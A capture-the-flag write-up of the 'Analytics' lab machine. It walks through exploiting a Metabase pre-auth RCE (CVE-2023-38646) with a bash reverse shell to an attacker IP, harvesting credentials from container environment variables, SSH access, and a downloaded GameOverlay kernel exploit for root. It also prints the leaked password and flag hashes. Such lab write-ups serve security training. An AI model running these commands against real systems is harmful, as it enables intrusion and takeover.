# CTF Writeup: Analytics

## Lab Description

Analytics is an easy difficulty Linux machine with exposed HTTP and SSH services. Enumeration of the website reveals a `Metabase` instance, which is vulnerable to Pre-Authentication Remote Code Execution (`[CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)`), which is leveraged to gain a foothold inside a Docker container. Enumerating the Docker container we see that the environment variables set contain credentials that can be used to SSH into the host. Post-exploitation enumeration reveals that the kernel version that is running on the host is vulnerable to `GameOverlay`, which is leveraged to obtain root privileges. 

---


## Reconaissance


An initial scan revealed the following information about services running on the target system.

```
nmap -A -p- --min-rate 10000 10.129.229.224
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 14:48 EDT
Nmap scan report for 10.129.229.224
Host is up (0.026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   16.15 ms 10.10.14.1
2   16.33 ms 10.129.229.224

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.93 seconds
```

Only http is open and it failed to redirect us to the domain "analytical.htb", let's map it to the target ip in our local dns file.

```
sudo echo "10.129.229.224 analytical.htb" | sudo tee -a /etc/hosts
```

Fuzzed for endpoints, but couldn't retrieve anything useful.

Enumerated subdomains and retrieved "data".

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://analytical.htb -H 'Host: FUZZ.analytical.htb' -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://analytical.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.analytical.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

data                    [Status: 200, Size: 77858, Words: 3574, Lines: 28, Duration: 120ms]
:: Progress: [100000/100000] :: Job [1/1] :: 1769 req/sec :: Duration: [0:01:20] :: Errors: 0 ::
```

Mapped this subdomain to the ip asw in our local dns file.

```
nano /etc/hosts
```

The webpage itself is an login page hosted by an service called "Metabase".
Performing an vulnerability assessment we found an Remote Code Execution PoC.
It requires an setup-token, which we can retrieve when sending an request to /api/session/properties.
Let's verify if this endpoint exists --> Claw'd the domain with BurpSuite Proxy and found endpoint and setup-token aswell. bd1eec30-a699-4b9e-ba5b-abee04808322
We also found out about an running ssh service within the server responses, which isn't displayed on the nmap scan tho.

```
bd1eec30-a699-4b9e-ba5b-abee04808322
```

Downloaded the Exploit on my local machine.

```
git clone https://github.com/m3m0o/metabase-pre-auth-rce-poc.git
```

Send an request to find out my setup-token

```
curl -v http://data.analytical.htb/api/session/properties
```


Started up listener on port 1337

```
nc -lvnp 1337
```

Ran exploit.

```
python3 main.py -u http://data.analytical.htb/ -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.186/1337 0>&1'"
```

Gained RCE as user "metabase".

```
rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.229.224] 52646
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
ab8ccaabc268:/$
```

the hostname seems weird. It looks like we are in a docker container.

.dockerenv file confirms that we are indeed in an docker environment.

```
ab8ccaabc268:/$ ls -la
ls -la
total 92
drwxr-xr-x    1 root     root          4096 Oct 28 18:49 .
drwxr-xr-x    1 root     root          4096 Oct 28 18:49 ..
-rwxr-xr-x    1 root     root             0 Oct 28 18:49 .dockerenv
drwxr-xr-x    1 root     root          4096 Jun 29  2023 app
drwxr-xr-x    1 root     root          4096 Jun 29  2023 bin
drwxr-xr-x    5 root     root           340 Oct 28 18:49 dev
drwxr-xr-x    1 root     root          4096 Oct 28 18:49 etc
drwxr-xr-x    1 root     root          4096 Aug  3  2023 home
drwxr-xr-x    1 root     root          4096 Jun 14  2023 lib
drwxr-xr-x    5 root     root          4096 Jun 14  2023 media
drwxr-xr-x    1 metabase metabase      4096 Aug  3  2023 metabase.db
drwxr-xr-x    2 root     root          4096 Jun 14  2023 mnt
drwxr-xr-x    1 root     root          4096 Jun 15  2023 opt
drwxrwxrwx    1 root     root          4096 Aug  7  2023 plugins
dr-xr-xr-x  208 root     root             0 Oct 28 18:49 proc
drwx------    1 root     root          4096 Aug  3  2023 root
drwxr-xr-x    2 root     root          4096 Jun 14  2023 run
drwxr-xr-x    2 root     root          4096 Jun 14  2023 sbin
drwxr-xr-x    2 root     root          4096 Jun 14  2023 srv
dr-xr-xr-x   13 root     root             0 Oct 28 18:49 sys
drwxrwxrwt    1 root     root          4096 Aug  3  2023 tmp
drwxr-xr-x    1 root     root          4096 Jun 29  2023 usr
drwxr-xr-x    1 root     root          4096 Jun 14  2023 var

```

Checking the env variable, we can retrieve credentials metalytics:An4lytics_ds20223#

```
ab8ccaabc268:/home$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=ab8ccaabc268
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/home
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=5
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
OLDPWD=/
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Logged into ssh with the retrieved creds.

```
ssh metalytics@10.129.229.224
The authenticity of host '10.129.229.224 (10.129.229.224)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:16: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.224' (ED25519) to the list of known hosts.
metalytics@10.129.229.224's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 28 07:31:15 PM UTC 2025

  System load:              0.22021484375
  Usage of /:               94.5% of 7.78GB
  Memory usage:             29%
  Swap usage:               0%
  Processes:                153
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.129.229.224
  IPv6 address for eth0:    dead:beef::250:56ff:fe94:8be3

  => / is using 94.5% of 7.78GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$
```

Retrieved user.txt in /home/metalytics directory.

```
754eaaee10a87ca86a1ff7ef37556b26
```

Checked the linux kernel version --> Vulnerable to "GameOverlay"

```
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

Found PoC for getting root shell.

```
wget https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/refs/heads/main/exploit.sh
```

Started up python server on local machine.

```
python3 -m http.server 80
```

Downloaded the file onto the target in /tmp directory

```
cd /tmp
wget http://10.10.14.186/exploit.sh
```

Gave the script executable rights & also ran it

```
chmod +x exploit.sh
./exploit.sh
```

Gained RCE as user "root"

```
metalytics@analytics:/tmp$ ./exploit.sh 
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:/tmp#
```

Oddly enough it says that the /root directory isn't accessible.



Retrieved root.txt in /root directory.

```
535008ca827605385aed37f8361d5f31
```
